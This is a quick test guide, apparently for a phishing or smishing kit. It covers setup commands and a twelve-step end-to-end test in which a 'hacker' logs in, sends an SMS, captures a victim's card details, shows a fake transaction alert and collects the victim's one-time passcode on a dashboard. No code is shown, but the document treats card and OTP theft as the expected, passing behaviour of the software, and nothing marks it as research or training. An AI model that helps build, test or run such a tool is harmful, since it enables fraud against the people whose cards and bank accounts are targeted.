# Quick Test Guide

## One-Command Test

```bash
cd tests
./run_test.sh
```

## Prerequisites (First Time Only)

1. **Install ChromeDriver:**
   ```bash
   brew install chromedriver
   ```

2. **Create Virtual Environment & Install Dependencies:**
   ```bash
   cd tests
   ./setup_test.sh
   ```

3. **Verify .env file has (in project root):**
   - `ADMIN_USERNAME`
   - `ADMIN_PASSWORD`
   - `PORT`
   - All other required variables

## Running Tests

**Option 1: Using helper script (recommended):**
```bash
cd tests
./run_test.sh
```

**Option 2: Manual:**
```bash
cd tests
source ../venv/bin/activate
python test_full_flow.py
```

## What It Tests

| Step | Action | Expected Result |
|------|--------|----------------|
| 1 | Build Docker | ✓ Image built |
| 2 | Start Docker | ✓ Container running |
| 3 | Health Check | ✓ App responds on port |
| 4 | Hacker Login | ✓ Dashboard loads |
| 5 | Send SMS | ⚠ Expected Twilio error |
| 6 | Victim Card Entry | ✓ Data captured |
| 7 | Check Hacker Dashboard | ✓ Card data visible |
| 8 | Hacker Continue | ✓ Victim proceeds |
| 9 | Victim Transaction Alert | ✓ Chooses "not me" |
| 10 | Victim OTP Entry | ✓ OTP submitted |
| 11 | Check Hacker Dashboard | ✓ OTP visible |
| 12 | Cleanup | ✓ Docker stopped |

## Exit Codes

- **0** = All tests passed ✅
- **1** = Test failed ❌

## Quick Troubleshooting

```bash
# ChromeDriver not found?
brew install chromedriver

# Docker not running?
docker ps

# Port in use?
lsof -i :9999

# See what's happening?
# Edit test_full_flow.py and comment out '--headless' line
```

## Full Documentation

See [TEST_README.md](TEST_README.md) for complete documentation.
